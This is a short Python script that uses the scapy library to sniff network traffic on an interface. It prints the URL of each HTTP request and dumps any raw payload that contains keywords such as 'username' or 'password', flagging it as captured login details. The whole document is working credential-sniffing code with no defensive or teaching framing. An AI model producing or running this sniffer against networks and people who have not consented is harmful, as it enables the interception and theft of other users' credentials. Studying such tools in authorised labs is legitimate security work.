import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f"HTTP Request: {url}")

        login_info = get_login_info(packet)
        if login_info:
            print(f"Possible username/password found: {login_info}")

    # Add more analysis for other protocols or layers as needed

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword.encode() in load:
                return load.decode()

if __name__ == "__main__":
    interface = "eth0"  # Replace with the appropriate network interface
    sniff(interface)
